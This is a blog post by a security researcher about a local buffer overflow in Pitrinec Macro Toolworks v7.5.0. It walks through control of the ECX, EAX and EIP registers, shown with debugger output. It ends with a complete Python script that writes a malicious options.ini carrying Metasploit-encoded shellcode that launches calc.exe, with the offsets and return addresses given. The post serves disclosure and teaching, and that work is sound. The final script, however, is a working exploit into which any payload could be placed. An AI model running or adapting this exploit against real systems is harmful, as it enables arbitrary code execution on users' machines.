---
title: Macro Toolworks v7.5.0 ... and how to launch a calc.exe
categories:
- Advisory
- Exploit
---
Hello readers,

I recently found a [local buffer overflow vulnerability in Pitrinec Macro Toolworks v7.5.0](http://db.inshell.net/advisory/10), which is very easy to exploit at all. For demonstration purposes I will show you one possible way of getting your own shellcode to run using this overflow. There might be other ,maybe even better ways too, but anyways it works :-) !

Let's have a look at the advisory published using Vulnerability-Lab:

{% highlight bash %}
The registers:

# EAX 0120EA00 Stack[000004C8]:0120EA00
# EBX FFFFFFFF
# ECX 42424242
# EDX 00000002
# ESI 007F6348 _prog.exe:007F6348
# EDI 007F6348 _prog.exe:007F6348
# EBP 0120EA0C Stack[000004C8]:0120EA0C
# ESP 0120E9E8 Stack[000004C8]:0120E9E8
# EIP 00646D36 _prog.exe:00646D36
# EFL 00200206
{% endhighlight %}

the crash:

{% highlight Assembly %}
# _prog.exe:00646D36 ; ----------------------------
# _prog.exe:00646D36 mov     eax, [ecx]
# _prog.exe:00646D38 call    dword ptr [eax+0Ch]
# _prog.exe:00646D3B call    near ptr unk_6750D0
# _prog.exe:00646D40 retn    4
# _prog.exe:00646D40 ; -----------------------------
{% endhighlight %}

This is a perfect example. I've got first only control of the ECX, but can gain control over the EIP and therefor application flow too. But what happens exactly ?

{% highlight Assembly %}
00646D36 mov     eax, [ecx]:
{% endhighlight %}

The content of the ECX (well at least only 4 bytes, because EAX is referenced as an address) will first be copied to the EAX. After that:

{% highlight Assembly %}
00646D38 call    dword ptr [eax+0Ch]
{% endhighlight %}

the EAX gets incremented by 12 (0Ch) and is then CALLed - so here could own shellcode be injected and executed. The published Proof of Concept only shows the explicit position of where the ECX gets filled:

{% highlight python %}
junk1="\x41" * 744
boom="\x42\x42\x42\x42"
junk2="\x43" * 100
{% endhighlight %}

After 744 bytes the following 4 bytes are used for the ECX:  
![]({{ site.baseurl }}/assets/IA10_1.png "IA10_1")

Since the content of the ECX is read (and copied to EAX), you can simply replace the "boom" variable from the PoC script with something more useful: Let's manipulate the ECX to point to the first address after the ECX location (which is 0x007F63A4):

{% highlight python %}
junk1="\x41" * 744
ecx=pack('<I',0x007F63A4)
junk2="\x43" * 100
{% endhighlight %}

and execute it:

![]({{ site.baseurl }}/assets/IA10_2.png "IA10_2")

The content of ECX (4bytes) has been copied to EAX, which means control over EAX!  
Next step: The EAX is read by the application, so all we have to do is put another manipulated address somehwere. What about taking just the next free address: 0x007F63A8 ?! This results in:

{% highlight python %}
junk1="\x41" * 744
ecx=pack('<I',0x007F63A4)
eax=pack('<I',0x007F63A8)
junk2="\x43" * 100
{% endhighlight %}

Execute and have a look:

![]({{ site.baseurl }}/assets/IA10_3.png "IA10_3")

Since the EAX gets CALLed we've got control over the EIP. Great it points to 0x007F63A8\. Doesn't it ? No, it doesn't ! The application adds another 12 bytes (0Ch) to the location of the EAX, which moves it 12 bytes onward. To solve this, I add a small nopsled of 12 bytes:

{% highlight python %}
junk1="\x41" * 744
ecx=pack('<I',0x007F63A4)
eax=pack('<I',0x007F63A8)
nops="\x90" * 12
junk2="\x43" * 100
{% endhighlight %}

Yay, I've got control over EIP due to the CALL which gets executed. Now I can do funny things, but let's do it the easy way: Let's just simply point the EIP to the beginning of our input string (which is 0x007F60B8):

{% highlight python %}
junk1="\x41" * 744
ecx=pack('<I',0x007F63A4)
eax=pack('<I',0x007F63A8)
nops="\x90" * 12
eip=pack('<I',0x007F60B8)
junk2="\x43" * 100
{% endhighlight %}

Now the shellcode can be placed at the beginning of the whole input string. There are 744 bytes of space for the shellcode...  
but remember that the number of bytes to fill with junk is relative to the shellcode size, what means you have to decrement the junk1 value to make it working:

{% highlight python %}
#!/usr/bin/python

# Exploit Title: Pitrinec Software Macro Toolworks Free/Standard/Pro v7.5.0 Local Buffer Overflow
# Version:       7.5.0
# Date:          2012-03-04
# Author:        Julien Ahrens
# Homepage:      https://www.rcesecurity.com
# Software Link: http://www.macrotoolworks.com
# Tested on:     Windows XP SP3 Professional German / Windows 7 SP1 Home Premium German
# Notes:         Overflow occurs in _prog.exe, vulnerable are all Pitrinec applications on the same way.
# Howto:         Copy options.ini to App-Dir --> Launch

# Crash:
# _prog.exe:00646D36 ; ---------------------------------------------------------------------------
# _prog.exe:00646D36 mov     eax, [ecx]
# _prog.exe:00646D38 call    dword ptr [eax+0Ch]
# _prog.exe:00646D3B call    near ptr unk_6750D0
# _prog.exe:00646D40 retn    4
# _prog.exe:00646D40 ; ---------------------------------------------------------------------------
from struct import pack

file="options.ini"

junk1="\x41" * 517
ecx=pack('<I',0x007F63A4)
eax=pack('<I',0x007F63A8)
nops="\x90" * 12
eip=pack('<I',0x007F60B8)

# windows/exec CMD=calc.exe
# Encoder: x86/shikata_ga_nai
# powered by Metasploit
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00'

shellcode = ("\xba\x68\x3e\x85\x1f\xd9\xca\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x33\x31\x50\x12\x83\xe8\xfc\x03\x38\x30\x67\xea\x44" +
"\xa4\xee\x15\xb4\x35\x91\x9c\x51\x04\x83\xfb\x12\x35\x13" +
"\x8f\x76\xb6\xd8\xdd\x62\x4d\xac\xc9\x85\xe6\x1b\x2c\xa8" +
"\xf7\xad\xf0\x66\x3b\xaf\x8c\x74\x68\x0f\xac\xb7\x7d\x4e" +
"\xe9\xa5\x8e\x02\xa2\xa2\x3d\xb3\xc7\xf6\xfd\xb2\x07\x7d" +
"\xbd\xcc\x22\x41\x4a\x67\x2c\x91\xe3\xfc\x66\x09\x8f\x5b" +
"\x57\x28\x5c\xb8\xab\x63\xe9\x0b\x5f\x72\x3b\x42\xa0\x45" +
"\x03\x09\x9f\x6a\x8e\x53\xe7\x4c\x71\x26\x13\xaf\x0c\x31" +
"\xe0\xd2\xca\xb4\xf5\x74\x98\x6f\xde\x85\x4d\xe9\x95\x89" +
"\x3a\x7d\xf1\x8d\xbd\x52\x89\xa9\x36\x55\x5e\x38\x0c\x72" +
"\x7a\x61\xd6\x1b\xdb\xcf\xb9\x24\x3b\xb7\x66\x81\x37\x55" +
"\x72\xb3\x15\x33\x85\x31\x20\x7a\x85\x49\x2b\x2c\xee\x78" +
"\xa0\xa3\x69\x85\x63\x80\x86\xcf\x2e\xa0\x0e\x96\xba\xf1" +
"\x52\x29\x11\x35\x6b\xaa\x90\xc5\x88\xb2\xd0\xc0\xd5\x74" +
"\x08\xb8\x46\x11\x2e\x6f\x66\x30\x4d\xee\xf4\xd8\xbc\x95" +
"\x7c\x7a\xc1")

poc="[last]\n"
poc=poc + "file=" + shellcode + junk1 + ecx + eax + nops + eip

try:
    print "[*] Creating exploit file...\n"
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print "[*] File successfully created!"
except:
    print "[!] Error while creating file!"
    {% endhighlight %}

Launch the application! Great the calc.exe gets launched.

And by the way: This is quite a stable exploit, since we do not have to rely on 3rd party CALL addresses or something like that. It's working on Windows XP SP3 and Windows 7 SP1 :-)

If you find other ways of exploiting, just leave a comment here :-)
